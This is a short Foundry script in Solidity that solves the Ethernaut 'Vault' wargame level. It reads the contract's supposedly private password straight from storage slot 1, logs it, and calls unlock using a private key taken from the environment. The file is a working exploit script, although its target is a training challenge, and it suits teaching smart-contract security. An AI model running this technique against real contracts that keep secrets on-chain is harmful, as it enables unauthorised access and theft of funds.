// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/vault.sol";

contract VaultAttackScript is Script {
    Vault public vault = Vault(0x3C8Bfd86F2413f30843315A590D217Dc67B247D7);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        console2.log("Password:");
        console2.logBytes32(password);
        vault.unlock(password);
        vm.stopBroadcast();
    }
}
